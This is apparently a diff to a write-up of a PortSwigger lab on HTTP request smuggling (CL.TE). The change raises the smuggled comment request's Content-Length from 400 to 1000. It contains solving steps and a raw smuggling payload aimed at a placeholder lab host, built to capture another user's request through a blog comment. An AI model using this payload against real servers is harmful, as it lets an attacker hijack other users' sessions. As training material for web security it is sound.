@@ -12,7 +12,7 @@ You use **HTTP request smuggling (CL.TE)** to trick the back-end into treating t
 ## 🛠 Steps to Solve
 1. Visit a blog post and post a comment.
 2. Send the `comment-post` request to Burp Repeater, shuffle the body parameters so the `comment` parameter occurs last, and make sure it still works.
-3. Increase the `comment-post` request's `Content-Length` to 400, then smuggle it to the back-end server:
+3. Increase the `comment-post` request's `Content-Length` to 1000, then smuggle it to the back-end server:
    ```sh
    POST / HTTP/1.1
    Host: YOUR-LAB-ID.web-security-academy.net
@@ -24,7 +24,7 @@ You use **HTTP request smuggling (CL.TE)** to trick the back-end into treating t
 
    POST /post/comment HTTP/1.1
    Content-Type: application/x-www-form-urlencoded
-   Content-Length: 400
+   Content-Length: 1000
    Cookie: session=your-session-token
 
    csrf=your-csrf-token&postId=5&name=hacker1&email=hacker%40email.net&website=&comment=test
